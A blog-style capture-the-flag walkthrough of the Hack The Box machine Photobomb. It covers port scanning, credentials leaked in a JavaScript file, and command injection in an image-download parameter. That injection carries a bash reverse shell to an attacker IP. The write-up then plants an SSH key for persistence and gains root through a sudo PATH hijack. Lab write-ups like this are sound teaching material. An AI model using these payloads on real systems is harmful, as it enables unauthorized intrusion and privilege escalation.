---
title: Photobomb
published: true
layout: post
---

<br />

---------------
Photobomb is an easy Linux machine where plaintext credentials are used to access an internal web application with a `Download` functionality that is vulnerable to a blind command injection. Once a foothold as the machine's main user is established, a poorly configured shell script that references binaries without their full paths is leveraged to obtain escalated privileges, as it can be ran with `sudo`. 
<br />

<iframe style="aspect-ratio: 16 / 9; width: 65%; display: block; margin: auto;" src="https://www.youtube.com/embed/NdROSd18zYU?si=BPr2eaJXlPYmwWQw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<br />

---------------------------------------------------
<br />

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />

Let's start by scanning for **open ports**:

```bash
sudo nmap -sS 10.10.11.182 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.11.182 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```
<br />

There are **2 open ports**:
+ **22/tcp**
+ **80/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.11.182 -p 22,80 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```
<br />

There are a lot of services that does not provide relevant information, but the ones that do are:
+ **22/tcp OpenSSH 8.2p1**
+ **80/tcp nginx 1.18.0**

<br />

We also find out a **hostname**, so let's add it:

```bash
echo '10.10.11.182 photobomb.htb' | sudo tee --append /etc/hosts
```
<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.11.182 -p 22,80 -T4 --min-rate 5000 --script="vuln or intrusive or discovery" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
```
<br />

This scan didn't return any relevant information.
<br />

------
<br />
### Foothold

When we visit the website, this is what it looks like:<br />

![](/assets/Photobomb/1.png)
<br />
<br />

When we click on ***click here!***, we are prompted for credentials by an **HTTP Basic Auth mechanism**, inspecting the source code of the website we can find a file named ***photobomb.js*** that contains credentials:

```JavaScript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
<br />

With this credentials we can login in the website, accessing **/printer**:<br />

![](/assets/Photobomb/2.png)
<br />
<br />

I couldn't find anything in the image metadata, so I started looking in the **request to download the image**:<br />

![](/assets/Photobomb/3.png)
<br />
<br />

We can try to **inject commands** in this parameters, luckily for us the **filetype parameter is vulnerable**:

```bash
photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg%3b+ping+-c+1+10.10.16.7&dimensions=30x20
sudo tcpdump -vvvXi tun0 icmp
```

![](/assets/Photobomb/4.png)
<br />
<br />

Great! We achieved command execution, let's send us a **reverse shell**, remember to set up the **listener**:

```bash
rlwrap nc -nlvp 4444
photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg%3b+/bin/bash+-c+'/bin/bash+-i+>%26+/dev/tcp/10.10.16.7/4444+0>%261'&dimensions=30x20
```

![](/assets/Photobomb/5.png)
<br />
<br />

Let's **connect via SSH** uploading our **public key**:

```bash
Victim> mkdir ~/.ssh
Victim> echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpE4QtZoJ4GLwvKxM3BUvFKp/pI5lKsK34c+4m6AhZg tanades@kali' > ~/.ssh/authorized_keysç
Attacker> ssh wizard@photobomb.htb
```

![](/assets/Photobomb/6.png)
<br />
<br />

---
<br />

### Privilege Escalation

Let's enumerate what commands we can run as `sudo`:

```bash
sudo -l
```

![](/assets/Photobomb/7.png)
<br />
<br />

There's something special about this line, ***SETENV:*** is used to specify the **$PATH environmental variable** at the time of running `sudo`, let's inspect the script:

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
<br />

In this script, the `find` command is specified using a **relative path**, we can leverage this by creating a **find script** in our **home directory** and specify it as the **first path** in the $PATH environmental variable:

```bash
echo 'chmod u+s /bin/bash' > /home/wizard/find
chmod +x /home/wizard/find
sudo PATH=/home/wizard:$PATH /opt/cleanup.sh
```
<br />

Let's see if it has worked and escalate privileges:

```bash
ls -l /bin/bash
bash -p
```

![](/assets/Photobomb/8.png)
<br />
<br />
